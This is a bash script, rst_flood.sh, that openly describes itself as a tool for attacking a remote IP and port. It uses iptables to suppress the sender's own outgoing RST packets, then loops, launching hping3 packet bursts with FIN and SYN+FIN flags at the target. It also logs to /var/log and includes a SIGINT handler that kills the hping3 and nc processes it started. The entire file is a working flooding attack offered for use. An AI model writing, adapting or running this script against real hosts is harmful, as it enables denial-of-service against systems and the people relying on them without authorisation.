#!/bin/bash

function print_help ()
{
  echo "Usage: \"rst_flood.sh -d IP -p PORT\""
  echo -e "It is mandatory to include -d and -p option, script should be run with sudo."
  echo -e "-d \t --ip-destination \t\t Ip destination to be attacked by rst flood."
  echo -e "-p \t --port-destination \t\tPort which will be attacked on the remote TCP end point."
  echo -e "-i \t --interval \t\tInterval between iterations."
  exit
}

ip_destination="";
port="";

while [[ $# -gt 0 ]]; do
  ARG="$1"
  case $ARG in
    "-d"|"--ip-destination")
      ip_destination="$2"
      shift
      shift
      ;;
    "-p"|"--port-destination")
      port="$2"
      shift
      shift
      ;;
    "-i"|"--interval")
      interval="$2"
      shift
      shift
      ;;
    "-c"|"--count")
      count="$2"
      shift
      shift
      ;;
    "-h"|"--help")
      print_help
      shift
      ;;
    *)
      echo "Try rst_flood.sh -h or --help"
      exit
      ;;
  esac
done

if [ -z $ip_destination ] || [ -z $port ] || [ -z $count ]; then
  echo "IP destination or port not set, please try rst_flood.sh -h or --help"
  exit 1;
fi

sigprocess()
{
   echo "SIGINT received, killing involved processes"
   PIDS=`ps aux | grep hping3 | grep -v grep | awk '{print $2}'`
   for PID in $PIDS; do
     disown $PID
     kill -9 $PID
   done
   PIDS=`ps aux | grep "nc " | grep -v grep | awk '{print $2}'`
   for PID in $PIDS; do
     disown $PID
     kill -9 $PID
   done
}

# Trap SIGINT
trap 'sigprocess' SIGINT

echo "Attacking remote $ip_destination and port $port"

iptables -I OUTPUT 1 -d $ip_destination -p tcp --tcp-flags RST RST -j DROP
iterator=0;
while [ $iterator -lt $count ]; do
  hping3 -V -c 1 -M 2 -F "$ip_destination" -p "$port" -c 5 >> /var/log/hping3.log 2>&1 &
  sleep 0.02 > /dev/null
  hping3 -V -c 1 -M 1 -F -S "$ip_destination" -p "$port" -c 5 >> /var/log/hping3.log 2>&1 &
  sleep 0.02 > /dev/null
  iterator=$(( $iterator+1 ))
  sleep 0.1
done
echo "Killing all involved processes"

iptables -D OUTPUT -d $ip_destination -p tcp --tcp-flags RST RST -j DROP;


#
# PIDS=`ps aux | grep hping3 | grep -v grep | awk '{print $2}'`
# for PID in $PIDS; do
#   disown $PID
#   kill -9 $PID
# done
# PIDS=`ps aux | grep "nc " | grep -v grep | awk '{print $2}'`
# for PID in $PIDS; do
#   disown $PID
#   kill -9 $PID
# done
